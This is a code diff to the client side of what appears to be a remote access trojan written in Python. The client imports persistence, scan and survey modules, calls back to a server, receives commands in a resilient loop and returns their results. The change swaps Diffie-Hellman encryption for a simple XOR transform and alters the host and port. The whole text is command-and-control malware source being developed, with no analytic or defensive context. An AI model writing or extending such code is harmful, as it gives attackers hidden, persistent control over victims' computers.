@@ -9,11 +9,11 @@ import socket
 import sys
 import time
 
-from core import crypto, persistence, scan, survey, toolkit
+from core import transform, persistence, scan, survey, toolkit
 
 # change these to suit your needs
-HOST = 'localhost'
-PORT = 8084
+HOST = '127.0.0.1'
+PORT = 8004
 
 # seconds to wait before client will attempt to reconnect
 CONN_TIMEOUT = 5
@@ -30,12 +30,12 @@ else:
     sys.exit(1)
 
 
-def client_loop(conn, dhkey):
+def client_loop(conn):
     while True:
         results = ''
 
         # wait to receive data from server
-        data = crypto.decrypt(conn.recv(4096), dhkey)
+        data = transform.xor(conn.recv(4096))
 
         # seperate data into command and action
         cmd, _, action = data.partition(' ')
@@ -82,7 +82,7 @@ def client_loop(conn, dhkey):
 
         results = results.rstrip() + '\n{} completed.'.format(cmd)
 
-        conn.send(crypto.encrypt(results, dhkey))
+        conn.send(transform.xor(results))
 
 
 def main():
@@ -102,13 +102,11 @@ def main():
             time.sleep(CONN_TIMEOUT)
             continue
 
-        dhkey = crypto.diffiehellman(conn)
-
         # This try/except statement makes the client very resilient, but it's
         # horrible for debugging. It will keep the client alive if the server
         # is torn down unexpectedly, or if the client freaks out.
         try:
-            exit_status = client_loop(conn, dhkey)
+            exit_status = client_loop(conn)
         except: pass
 
         if exit_status:
